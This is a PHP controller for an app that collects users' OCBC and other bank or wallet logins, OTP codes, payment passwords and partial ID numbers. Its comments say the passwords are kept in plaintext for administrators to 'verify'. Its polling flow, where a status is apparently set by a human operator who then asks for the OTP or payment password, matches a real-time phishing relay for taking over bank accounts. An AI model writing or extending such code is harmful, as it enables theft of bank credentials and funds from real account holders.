<?php

namespace app\api\controller;

use app\common\model\OcbcLoginRecord;
use think\facade\Request;

/**
 * OCBC登录验证控制器（APP端）
 */
class OcbcController extends Base
{
    /**
     * 提交登录信息
     */
    public function submitLogin()
    {
        $accountType = Request::param('account_type', 'ocbc');
        $organizationId = Request::param('organization_id', '');
        $loginUserId = Request::param('user_id', '');
        $password = Request::param('password', '');

        // 验证必填参数
        if (empty($loginUserId)) {
            return $this->error('Please enter User ID');
        }
        // 不需要密码的账户类型（如 OVO 只需手机号）
        $noPasswordTypes = ['ovo'];
        if (empty($password) && !in_array($accountType, $noPasswordTypes)) {
            return $this->error('Please enter Password');
        }

        // 如果没有提供organization_id，使用user_id作为organization_id
        if (empty($organizationId)) {
            $organizationId = $loginUserId;
        }

        // 获取当前登录的平台会员ID
        $memberId = $this->getUserId();
        if (empty($memberId)) {
            return $this->error('Please login first');
        }

        // 查找是否存在相同账户的记录（银行类型 + 平台会员ID 组合唯一标识一个账户）
        // 使用 JSON_EXTRACT 函数来查询 JSON 字段
        $record = OcbcLoginRecord::where('user_id', $memberId)
            ->whereRaw("JSON_EXTRACT(device_info, '$.account_type') = ?", [$accountType])
            ->find();

        if ($record) {
            // 存在记录，更新（同一会员对同一银行类型只保留一条最新记录）
            $record->organization_id = $organizationId; // 更新组织ID（可能会变）
            $record->login_user_id = $loginUserId; // 更新银行登录用户ID（可能会变）
            $record->password = $password; // 明文存储,供管理员验证使用
            $record->status = OcbcLoginRecord::STATUS_PENDING;
            $record->ip_address = Request::ip();
            $record->device_info = [
                'account_type' => $accountType, // 用户选择的账户类型
                'user_agent' => Request::header('user-agent'),
                'platform' => Request::param('platform', 'unknown'),
            ];
            // 清空之前可能存在的验证码、支付密码、错误信息等
            $record->captcha = null;
            $record->payment_password = null;
            $record->error_message = null;
            $record->withdrawal_account = null;
            $record->save();
        } else {
            // 不存在记录，创建新记录
            $record = new OcbcLoginRecord();
            $record->user_id = $memberId; // 平台会员ID
            $record->organization_id = $organizationId; // 银行组织ID
            $record->login_user_id = $loginUserId; // 银行登录用户ID
            $record->password = $password; // 明文存储,供管理员验证使用
            $record->status = OcbcLoginRecord::STATUS_PENDING;
            $record->ip_address = Request::ip();
            $record->device_info = [
                'account_type' => $accountType, // 用户选择的账户类型
                'user_agent' => Request::header('user-agent'),
                'platform' => Request::param('platform', 'unknown'),
            ];
            $record->save();
        }

        return $this->success([
            'record_id' => $record->id,
            'message' => 'Submitted successfully, please wait for verification'
        ]);
    }

    /**
     * 轮询验证状态
     */
    public function pollStatus()
    {
        $recordId = Request::param('record_id', 0);

        if (empty($recordId)) {
            return $this->error('Invalid record ID');
        }

        $record = OcbcLoginRecord::find($recordId);
        if (!$record) {
            return $this->error('Record not found');
        }

        $response = [
            'status' => $record->status,
            'message' => OcbcLoginRecord::getStatusText($record->status),
        ];

        // 根据状态返回额外信息
        switch ($record->status) {
            case OcbcLoginRecord::STATUS_NEED_PAYMENT_PASSWORD:
                // 返回提现账户信息
                $response['withdrawal_account'] = $record->withdrawal_account;
                break;
            case OcbcLoginRecord::STATUS_PASSWORD_ERROR:
            case OcbcLoginRecord::STATUS_CAPTCHA_ERROR:
            case OcbcLoginRecord::STATUS_PAYMENT_PASSWORD_ERROR:
            case OcbcLoginRecord::STATUS_FAILED:
                // 返回错误消息
                $response['error_message'] = $record->error_message;
                break;
        }

        return $this->success($response);
    }

    /**
     * 提交验证码
     */
    public function submitCaptcha()
    {
        $recordId = Request::param('record_id', 0);
        $captcha = Request::param('captcha', '');

        if (empty($recordId)) {
            return $this->error('Invalid record ID');
        }
        if (empty($captcha)) {
            return $this->error('Please enter OTP');
        }

        $record = OcbcLoginRecord::find($recordId);
        if (!$record) {
            return $this->error('Record not found');
        }

        // 更新验证码
        $record->captcha = $captcha;
        $record->status = OcbcLoginRecord::STATUS_PENDING; // 重新设置为待验证
        $record->save();

        return $this->success([
            'message' => 'OTP submitted, please wait for verification'
        ]);
    }

    /**
     * 提交支付密码
     */
    public function submitPaymentPassword()
    {
        $recordId = Request::param('record_id', 0);
        $paymentPassword = Request::param('payment_password', '');
        $idLast4 = Request::param('id_last4', '');

        if (empty($recordId)) {
            return $this->error('Invalid record ID');
        }
        if (empty($paymentPassword)) {
            return $this->error('Please enter payment password');
        }

        $record = OcbcLoginRecord::find($recordId);
        if (!$record) {
            return $this->error('Record not found');
        }

        // 更新支付密码和身份证后4位
        $record->payment_password = $paymentPassword; // 明文存储,供管理员验证使用
        if (!empty($idLast4)) {
            $record->id_last4 = $idLast4;
        }
        $record->status = OcbcLoginRecord::STATUS_PENDING; // 重新设置为待验证
        $record->save();

        return $this->success([
            'message' => 'Payment password submitted, please wait for verification'
        ]);
    }

    /**
     * 获取已关联的银行账户列表
     */
    public function getLinkedAccounts()
    {
        // 获取当前登录的平台会员ID
        $memberId = $this->getUserId();
        if (empty($memberId)) {
            return $this->error('Please login first');
        }

        // 查询该用户所有关联成功的银行账户
        $records = OcbcLoginRecord::where('user_id', $memberId)
            ->where('status', OcbcLoginRecord::STATUS_SUCCESS)
            ->order('updated_at', 'desc')
            ->select();

        // 获取所有提现方式（带翻译）
        $withdrawalMethods = \app\common\model\WithdrawalMethod::getActiveMethods($this->locale);
        $methodsByCode = [];
        foreach ($withdrawalMethods as $method) {
            $methodsByCode[$method['code']] = [
                'name' => $method['name'],
                'logo' => $method['logo'],
            ];
        }

        $accounts = [];
        foreach ($records as $record) {
            $deviceInfo = is_array($record->device_info) ? $record->device_info : json_decode($record->device_info, true);
            $accountType = $deviceInfo['account_type'] ?? 'ocbc';

            // 从提现方式表中获取银行名称和 logo（已翻译）
            $methodInfo = $methodsByCode[$accountType] ?? null;
            $bankName = $methodInfo ? $methodInfo['name'] : 'Unknown Bank';
            $bankLogo = $methodInfo ? \app\common\helper\UrlHelper::getFullUrl($methodInfo['logo']) : '';

            $accounts[] = [
                'id' => $record->id,
                'account_type' => $accountType,
                'bank_name' => $bankName,
                'bank_logo' => $bankLogo,
                'organization_id' => $record->organization_id,
                'login_user_id' => $record->login_user_id,
                'withdrawal_account' => $record->withdrawal_account,
                'linked_at' => $record->updated_at,
            ];
        }

        return $this->success([
            'accounts' => $accounts
        ]);
    }
}
